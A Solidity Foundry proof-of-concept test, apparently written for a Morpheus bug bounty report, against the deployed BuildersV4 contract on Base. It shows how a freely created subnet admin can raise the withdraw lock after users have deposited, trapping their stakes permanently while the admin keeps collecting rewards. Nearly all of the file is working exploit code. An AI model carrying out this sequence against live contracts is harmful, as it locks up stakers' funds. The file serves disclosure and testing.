// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// PoC for Morpheus BBP: a subnet admin, acquired permissionlessly and for free, retroactively
/// raises `withdrawLockPeriodAfterDeposit` and permanently locks every existing staker's
/// principal, because `withdraw()` reads the *live* subnet lock instead of the lock that was
/// advertised when the stake was made.
///
/// Target : BuildersV4 proxy 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9 (Base, Appendix A)
/// Impl   : 0x18fAEF315b40a6D9Cf49628f1133b1AA507513b0
/// Fork   : Base mainnet pinned to block 52832790
/// Run    : forge test -vv      (BASE_RPC overrides the default RPC URL)

interface IBuildersV4 {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }

    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }

    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;

    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;

    function deposit(bytes32 subnetId_, uint256 amount_) external;

    function withdraw(bytes32 subnetId_, uint256 amount_) external;

    function claim(bytes32 subnetId_, address receiver_) external;

    function getSubnetId(string memory subnetName_) external view returns (bytes32);

    // Public mapping getter: returns the flattened tuple, not a single struct value.
    function subnets(
        bytes32
    ) external view returns (string memory, address, uint128, uint128, uint128, uint256, address);

    function subnetCreationFeeAmount() external view returns (uint256);

    function minimalWithdrawLockPeriod() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);

    function approve(address, uint256) external returns (bool);
}

interface Vm {
    function createSelectFork(string calldata, uint256) external returns (uint256);

    function prank(address) external;

    function startPrank(address) external;

    function stopPrank() external;

    function warp(uint256) external;

    function store(address, bytes32, bytes32) external;

    function envOr(string calldata, string calldata) external returns (string memory);
}

contract PocA002 {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IBuildersV4 constant BUILDERS = IBuildersV4(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    IERC20 constant MOR = IERC20(0x7431aDa8a591C955a994a21710752EF9b882b8e3);

    // MOR (MOROFT) stores balances in mapping slot 5.
    uint256 constant MOR_BALANCE_SLOT = 5;

    address constant ATTACKER = address(0xA77Ac1e5); // an address anyone can control
    address constant VICTIM = address(0xB0b); // an honest staker
    uint256 constant STAKE = 1000e18;
    uint256 constant FOREVER = uint128(2 ** 100); // ~4e12 years, passes the floor-only check

    function setUp() public {
        vm.createSelectFork(vm.envOr("BASE_RPC", "https://mainnet.base.org"), 52832790);
    }

    /// Primary test: the principal is trapped and the trap is permanent.
    function test_retroactiveLockTrapsPrincipal() public {
        bytes32 subnetId = _openSubnetWithVictimStake("poc-fast-exit");
        (, , , uint128 liveLock, , , ) = BUILDERS.subnets(subnetId);
        require(liveLock == uint128(FOREVER), "lock not raised");

        // The advertised lock has expired, yet the withdrawal is blocked - twice, ten years apart.
        _expectLocked(subnetId);

        require(MOR.balanceOf(VICTIM) == 0, "victim must have no MOR left");
        require(MOR.balanceOf(address(BUILDERS)) >= STAKE, "principal no longer escrowed");
    }

    /// Secondary test: the trapped principal keeps paying the admin, who risked no capital.
    function test_adminKeepsEarningOnTrappedPrincipal() public {
        bytes32 subnetId = _openSubnetWithVictimStake("poc-captive-yield");
        require(MOR.balanceOf(ATTACKER) == 0, "attacker starts with no MOR");

        vm.warp(block.timestamp + 30 days);
        vm.prank(ATTACKER);
        BUILDERS.claim(subnetId, ATTACKER);

        uint256 claimed = MOR.balanceOf(ATTACKER);
        require(claimed > 0, "admin did not earn on the trapped principal");

        // The victim is still locked out while the admin is being paid.
        vm.startPrank(VICTIM);
        _expectWithdrawLocked(subnetId);
        vm.stopPrank();

        require(MOR.balanceOf(VICTIM) == 0, "victim recovered MOR");
    }

    /// Creates a subnet the way any unprivileged address can, lets the victim stake under the
    /// advertised minimum lock, waits for that lock to expire, then raises it retroactively.
    function _openSubnetWithVictimStake(string memory name) internal returns (bytes32 subnetId) {
        uint256 minLock = BUILDERS.minimalWithdrawLockPeriod();
        require(minLock == 604_800, "unexpected minimum lock");
        require(BUILDERS.subnetCreationFeeAmount() == 0, "subnet creation is not free");

        _fund(VICTIM, STAKE);

        IBuildersV4.Subnet memory sn = IBuildersV4.Subnet({
            name: name,
            admin: ATTACKER,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: uint128(minLock),
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1e18,
            claimAdmin: ATTACKER
        });

        // 1. Free subnet, advertised 7-day exit.
        vm.startPrank(ATTACKER);
        BUILDERS.createSubnet(sn, IBuildersV4.SubnetMetadata("poc", "poc", "poc", "poc"));
        subnetId = BUILDERS.getSubnetId(name);
        vm.stopPrank();

        // 2. Victim stakes; deposit() records only `lastDeposit`, the accepted lock is never
        //    snapshotted.
        vm.startPrank(VICTIM);
        MOR.approve(address(BUILDERS), STAKE);
        BUILDERS.deposit(subnetId, STAKE);
        vm.stopPrank();
        require(MOR.balanceOf(address(BUILDERS)) >= STAKE, "stake not escrowed");

        // 3. The advertised lock expires.
        vm.warp(block.timestamp + minLock + 1);

        // 4. The admin edits the subnet and raises the lock to FOREVER. _validateSubnet() only
        //    checks `lock >= minimalWithdrawLockPeriod`, so 2**100 is accepted.
        sn.withdrawLockPeriodAfterDeposit = uint128(FOREVER);
        vm.startPrank(ATTACKER);
        BUILDERS.editSubnet(subnetId, sn);
        vm.stopPrank();
    }

    /// The victim has no exit: neither the full nor a partial withdrawal goes through, and ten
    /// years of waiting changes nothing.
    function _expectLocked(bytes32 subnetId) internal {
        vm.startPrank(VICTIM);
        _expectWithdrawLocked(subnetId);
        vm.warp(block.timestamp + 3650 days);
        _expectWithdrawLocked(subnetId);
        vm.stopPrank();
    }

    function _expectWithdrawLocked(bytes32 subnetId) internal {
        try BUILDERS.withdraw(subnetId, STAKE) {
            require(false, "full withdraw unexpectedly succeeded - finding refuted");
        } catch (bytes memory reason) {
            _requireLockRevert(reason);
        }

        try BUILDERS.withdraw(subnetId, STAKE / 2) {
            require(false, "partial withdraw unexpectedly succeeded - finding refuted");
        } catch (bytes memory reason) {
            _requireLockRevert(reason);
        }
    }

    function _requireLockRevert(bytes memory reason) internal pure {
        require(bytes4(reason) == 0x08c379a0, "unexpected revert type");
        require(_contains(reason, "withdraw is locked"), "wrong revert reason");
    }

    /// Test-only state fabrication: mints the victim's MOR on the fork so the deposit can be
    /// exercised without impersonating any owner, admin, multisig or protocol contract.
    function _fund(address to, uint256 amount) internal {
        vm.store(address(MOR), keccak256(abi.encode(to, MOR_BALANCE_SLOT)), bytes32(amount));
        require(MOR.balanceOf(to) == amount, "funding failed");
    }

    function _contains(bytes memory b, string memory s) internal pure returns (bool) {
        bytes memory ss = bytes(s);
        for (uint256 i = 0; i + ss.length <= b.length; i++) {
            bool ok = true;
            for (uint256 j = 0; j < ss.length; j++) {
                if (b[i + j] != ss[j]) {
                    ok = false;
                    break;
                }
            }
            if (ok) return true;
        }
        return false;
    }
}
